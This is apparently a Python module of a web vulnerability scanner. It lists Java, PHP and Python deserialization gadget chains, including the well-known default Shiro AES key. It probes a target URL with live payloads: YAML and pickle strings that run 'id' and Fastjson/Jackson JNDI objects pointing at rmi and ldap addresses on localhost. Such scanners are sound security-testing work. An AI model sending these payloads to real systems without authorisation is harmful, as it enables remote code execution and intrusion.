import base64
import hashlib
import hmac
import json
import struct
import time
from typing import Dict, List, Optional, Tuple
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("deserial_engine")

JAVA_GADGETS = {
    "CommonsCollections1": {
        "lib": "commons-collections:3.1",
        "payload_template": r"aced000573720032...",
        "description": "Commons Collections 1 反序列化链",
        "jdk_version": "JDK < 8u71",
    },
    "CommonsCollections2": {
        "lib": "commons-collections4:4.0",
        "payload_template": r"aced00057372003...",
        "description": "Commons Collections 2 反序列化链 (PriorityQueue)",
        "jdk_version": "JDK 7+",
    },
    "CommonsCollections3": {
        "lib": "commons-collections:3.1",
        "description": "Commons Collections 3 反序列化链 (InstantiateTransformer)",
        "jdk_version": "JDK < 8u71",
    },
    "CommonsCollections4": {
        "lib": "commons-collections4:4.0",
        "description": "Commons Collections 4 反序列化链 (TreeBag)",
        "jdk_version": "JDK 7+",
    },
    "CommonsCollections5": {
        "lib": "commons-collections:3.1",
        "description": "Commons Collections 5 反序列化链 (BadAttributeValueExpException)",
        "jdk_version": "JDK < 8u71",
    },
    "CommonsCollections6": {
        "lib": "commons-collections:3.1",
        "description": "Commons Collections 6 反序列化链 (HashSet/TiedMapEntry)",
        "jdk_version": "全版本",
    },
    "CommonsCollections7": {
        "lib": "commons-collections:3.1",
        "description": "Commons Collections 7 反序列化链 (Hashtable)",
        "jdk_version": "全版本",
    },
    "CommonsBeanutils1": {
        "lib": "commons-beanutils:1.9.2",
        "description": "Commons Beanutils 1 反序列化链",
        "jdk_version": "全版本",
    },
    "ShiroRememberMe": {
        "lib": "shiro < 1.2.5",
        "description": "Shiro RememberMe 反序列化 (AES-CBC硬编码密钥)",
        "key": "kPH+bIxk5D2deZiIxcaaaA==",
    },
    "Fastjson": {
        "lib": "fastjson < 1.2.83",
        "description": "Fastjson JNDI注入反序列化",
        "versions": ["1.2.24", "1.2.41", "1.2.42", "1.2.43", "1.2.45", "1.2.47", "1.2.62", "1.2.68"],
    },
    "Jackson": {
        "lib": "jackson-databind < 2.13.4.2",
        "description": "Jackson-databind 反序列化链",
    },
    "WeblogicT3": {
        "lib": "weblogic",
        "description": "WebLogic T3/IIOP 协议反序列化",
        "cves": ["CVE-2015-4852", "CVE-2016-0638", "CVE-2016-3510", "CVE-2017-3248", "CVE-2018-2628"],
    },
    "WeblogicXMLDecoder": {
        "lib": "weblogic",
        "description": "WebLogic XMLDecoder 反序列化",
        "cves": ["CVE-2017-10271", "CVE-2019-2725"],
    },
}

PHP_GADGETS = {
    "LaravelDebug": {
        "framework": "Laravel",
        "description": "Laravel Debug Mode RCE (CVE-2021-3129)",
        "key": "APP_KEY",
    },
    "ThinkPHP": {
        "framework": "ThinkPHP",
        "description": "ThinkPHP 反序列化RCE",
    },
    "Yii2": {
        "framework": "Yii2",
        "description": "Yii2 反序列化链 (GadgetChain)",
    },
    "WordPress": {
        "framework": "WordPress",
        "description": "WordPress PHP Object Injection",
    },
    "Drupal": {
        "framework": "Drupal",
        "description": "Drupal Drupalgeddon反序列化",
    },
}

PYTHON_GADGETS = {
    "PyYAML": {
        "lib": "pyyaml < 5.1",
        "description": "PyYAML unsafe_load 反序列化RCE",
    },
    "Pickle": {
        "lib": "pickle",
        "description": "Python Pickle反序列化RCE (任意代码执行)",
    },
    "Ruamel": {
        "lib": "ruamel.yaml",
        "description": "Ruamel YAML反序列化",
    },
    "jsonpickle": {
        "lib": "jsonpickle",
        "description": "jsonpickle反序列化RCE",
    },
}

JAVA_SER_HEADER = bytes([0xac, 0xed, 0x00, 0x05])
PHP_SER_PATTERNS = [b'O:', b'a:', b's:', b'i:', b'd:']
PYTHON_PICKLE_OPCODES = b'\x80'


class DeserializationDetector:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    def scan_target(self, target_url: str) -> List[Dict]:
        findings = []
        findings.extend(self._check_java_deserial(target_url))
        findings.extend(self._check_php_deserial(target_url))
        findings.extend(self._check_python_deserial(target_url))
        findings.extend(self._check_json_deserial(target_url))
        findings.extend(self._check_parameter_pollution(target_url))
        return findings

    def _check_java_deserial(self, target_url: str) -> List[Dict]:
        findings = []
        endpoints = [
            "/actuator/heapdump", "/jolokia/list", "/jmx-console/",
            "/invoker/JMXInvokerServlet", "/admin-api/actuator/heapdump",
        ]
        for endpoint in endpoints:
            url = f"{target_url.rstrip('/')}{endpoint}"
            resp = http_request("GET", url, timeout=self.timeout, verify=False)
            if resp and resp.get("status_code") == 200:
                body = resp.get("content", b"")
                if isinstance(body, str):
                    body = body.encode("latin-1")
                if JAVA_SER_HEADER in body[:100]:
                    findings.append({
                        "type": "java_deserialization",
                        "endpoint": endpoint,
                        "gadget_chain": "raw_serialized_object",
                        "risk_level": "critical",
                        "detail": "检测到Java序列化数据，可能存在反序列化漏洞",
                    })
                elif b"javax.management" in body or b"java.lang" in body:
                    findings.append({
                        "type": "java_deserialization",
                        "endpoint": endpoint,
                        "gadget_chain": "jmx_exposure",
                        "risk_level": "high",
                        "detail": "JMX/MBean暴露，可能被用于反序列化攻击",
                    })
        return findings

    def _check_php_deserial(self, target_url: str) -> List[Dict]:
        findings = []
        cookie_headers = [
            {"Cookie": f"PHPSESSID={base64.b64encode(b'O:1:\"A\":0:{}').decode()}"},
            {"Cookie": f"laravel_session={base64.b64encode(b's:5:\"test\";').decode()}"},
        ]
        for headers in cookie_headers:
            resp = http_request("GET", target_url, headers=headers, timeout=self.timeout, verify=False)
            if resp and resp.get("status_code") in (500, 503):
                error_text = str(resp.get("text", "")).lower()
                if any(kw in error_text for kw in ["unserialize", "unserializ", "__wakeup", "__destruct", "phar"]):
                    findings.append({
                        "type": "php_deserialization",
                        "risk_level": "high",
                        "detail": "PHP反序列化处理异常，可能存在可控输入",
                    })
        return findings

    def _check_python_deserial(self, target_url: str) -> List[Dict]:
        findings = []
        test_payloads = [
            ("yaml", "!!python/object/apply:os.system ['id']"),
            ("pickle", base64.b64encode(b"cos\nsystem\n(S'id'\ntR.")).decode()),
        ]
        for param, payload in test_payloads:
            resp = http_request("GET", f"{target_url}?{param}={payload}",
                              timeout=self.timeout, verify=False)
            if resp and resp.get("status_code") == 500:
                body = str(resp.get("text", "")).lower()
                if "yaml" in body or "pickle" in body or "deserializ" in body:
                    findings.append({
                        "type": "python_deserialization",
                        "parameter": param,
                        "risk_level": "critical",
                        "detail": f"Python {param}反序列化可能可控",
                    })
        return findings

    def _check_json_deserial(self, target_url: str) -> List[Dict]:
        findings = []
        jackson_payload = {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "rmi://127.0.0.1:1099/Exploit",
            "autoCommit": True,
        }
        fastjson_payload = {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://127.0.0.1:1389/Exploit",
            "autoCommit": True,
        }
        for payload_name, payload in [("jackson", jackson_payload), ("fastjson", fastjson_payload)]:
            for content_type in ["application/json", "application/x-www-form-urlencoded"]:
                resp = http_request("POST", target_url, json_data=payload,
                                  timeout=self.timeout, verify=False)
                if resp:
                    status = resp.get("status_code", 0)
                    body = str(resp.get("text", "")).lower()
                    if status == 500 and any(kw in body for kw in [
                        "jsonparseexception", "jsonmappingexception",
                        "autotype", "classname", "notfound",
                    ]):
                        findings.append({
                            "type": f"{payload_name}_deserialization",
                            "risk_level": "high",
                            "detail": f"{payload_name} 反序列化端点可能存在JNDI注入",
                        })
        return findings

    def _check_parameter_pollution(self, target_url: str) -> List[Dict]:
        findings = []
        deserial_params = ["data", "object", "payload", "content", "body", "input", "config"]
        for param in deserial_params:
            test_value = base64.b64encode(JAVA_SER_HEADER + b"test").decode()
            resp = http_request("GET", f"{target_url}?{param}={test_value}",
                              timeout=self.timeout, verify=False)
            if resp and resp.get("status_code") == 500:
                body = str(resp.get("text", "")).lower()
                if "invalidclassexception" in body or "streamcorrupted" in body or "serializ" in body:
                    findings.append({
                        "type": "parameter_deserialization",
                        "parameter": param,
                        "risk_level": "high",
                        "detail": f"参数 {param} 触发了Java反序列化处理",
                    })
        return findings


def scan_deserialization(target_url: str, timeout: int = 10) -> List[Dict]:
    detector = DeserializationDetector(timeout)
    return detector.scan_target(target_url)
